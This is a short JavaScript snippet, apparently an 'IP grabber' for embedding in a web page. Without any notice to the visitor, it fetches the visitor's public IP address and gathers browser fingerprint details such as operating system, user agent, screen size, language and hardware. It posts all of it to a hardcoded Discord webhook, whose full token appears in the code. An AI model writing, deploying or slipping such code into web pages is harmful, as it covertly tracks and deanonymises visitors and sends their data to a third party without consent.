var ip = '';
fetch('https://api.ipify.org/?format=json')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    ip = data.ip;
    var osName = navigator.platform;
    var browser = navigator.userAgent;
    var resolution = window.screen.width + 'x' + window.screen.height;
    var language = navigator.language;
    var vendor = navigator.vendor;
    var cookiesEnabled = navigator.cookieEnabled;
    var doNotTrack = navigator.doNotTrack;
    var hardwareConcurrency = navigator.hardwareConcurrency;
    var maxTouchPoints = navigator.maxTouchPoints;
    var webwhook = 'https://discord.com/api/webhooks/1125498024337088614/lc3Wst1oc8eKH4FrOpeIwGHk1ags0-tO6I6Cb58OvPCwqtSATsEr_Oj3yrwP1t08huO9';


    var message = {
      content: 
               '__**Grabbed Info**__' + '\n' + 
               '```js' + '\n' +
               'IP: ' + ip + '\n' +
               'Operating System: ' + osName + '\n' +
               'Browser: ' + browser + '\n' +
               'Resolution: ' + resolution + '\n' +
               'Language: ' + language + '\n' +
               'Vendor: ' + vendor + '\n' +
               'Cookies enabled: ' + cookiesEnabled + '\n' +
               'Do Not Track: ' + doNotTrack + '\n' +
               'Hardware Concurrency: ' + hardwareConcurrency + '\n' +
               'Max Touch Points: ' + maxTouchPoints + '\n' + 
               '```'
    };

    fetch(webwhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    });
  });
